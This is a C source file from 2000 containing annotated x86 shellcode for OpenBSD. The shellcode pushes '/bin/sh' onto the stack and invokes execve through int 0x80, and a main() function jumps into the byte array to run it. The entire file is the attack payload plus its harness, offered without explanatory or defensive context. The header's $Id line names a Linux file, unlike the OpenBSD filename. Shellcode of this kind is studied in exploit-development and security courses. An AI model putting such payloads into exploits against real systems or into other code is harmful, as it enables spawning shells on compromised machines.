/* 
 * shellcode-orig-openbsd-x86.c
 * Created: Mon Apr 24 19:54:01 2000 by tek@wiw.org
 * Revised: Mon Apr 24 19:54:01 2000 (pending)
 * Copyright 2000 Julian E. C. Squires (tek@wiw.org)
 * This program comes with ABSOLUTELY NO WARRANTY.
 * $Id: shellcode-orig-linux-x86.c,v 1.1.1.1 2000/04/25 00:25:46 tek Exp $
 * 
 */

unsigned char shellcode[] = {
    0x55,                               /* pushl %ebp */

    0x8B, 0xEC,                         /* movl %esp,%ebp */

    0x81, 0xEC, 0x10, 0x00, 0x00, 0x00, /* subl $16, %esp */

    /* movl $0x6E69622F, -8(%ebp) */
    0xC7, 0x45, 0xF8, 0x2F, 0x62, 0x69, 0x6E,

    /* movl $0x0068732F, -4(%ebp) */
    0xC7, 0x45, 0xFC, 0x2F, 0x73, 0x68, 0x00,

    /* movl $0x0, -12(%ebp) */
    0xC7, 0x45, 0xF4, 0x00, 0x00, 0x00, 0x00,

    0x89, 0x6D, 0xF0,                   /* movl %ebp, -16(%ebp) */

    /* subl $8, -16(%ebp) */
    0x81, 0x6D, 0xF0, 0x08, 0x00, 0x00, 0x00,

    /* subl $4, %esp */
    0x81, 0xEC, 0x04, 0x00, 0x00, 0x00,

    0x8D, 0x45, 0xF4,                   /* leal -12(%ebp),%eax */

    0x50,                               /* pushl %eax */
    
    0x8D, 0x45, 0xF0,                   /* leal -16(%ebp),%eax */

    0x50,                               /* pushl %eax */

    0x8B, 0x45, 0xF0,                   /* movl -16(%ebp),%eax */

    0x50,                               /* pushl %eax */

    /* subl $4, %esp */
    0x81, 0xEC, 0x04, 0x00, 0x00, 0x00,

    /* movl $0x3b, %eax */
    0xB8, 0x3B, 0x00, 0x00, 0x00,

    0xCD, 0x80                          /* int $0x80 */
};

int main(void)
{
    (*(void(*)(void))shellcode)();
}

/* EOF shellcode-orig-openbsd-x86.c */
